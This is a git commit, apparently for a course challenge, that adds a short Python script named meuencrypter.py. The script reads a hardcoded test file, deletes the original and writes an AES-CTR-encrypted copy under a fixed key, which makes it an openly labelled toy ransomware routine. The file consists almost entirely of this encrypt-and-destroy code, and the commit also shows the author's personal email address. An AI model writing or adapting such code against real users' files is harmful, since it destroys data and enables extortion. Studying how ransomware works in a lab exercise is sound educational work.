430fd2052316a5e68903514ce21857fc9ba7a356
Pedro <pedromansoo28@gmail.com>
2025-01-31 04:38:14 -0300

    Adicionados os arquivos criados para o desafio

---
+++ meuencrypter.py
@@ -0,0 +1,29 @@
+import os
+import pyaes
+
+# abrir o arquivo a ser criptografado
+
+file_name = 'meuteste.txt'
+file = open(file_name,'rb')
+file_data = file.read()
+file.close
+
+## remover arquivo original
+
+os.remove(file_name)
+
+### definir a chave de encriptação
+
+key = b"meutesteransomwa"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+#### criptografar o arquivo
+
+crypto_data = aes.encrypt(file_data)
+
+##### salvar o arquivo criptografado
+
+new_file = file_name + '.encriptado'
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
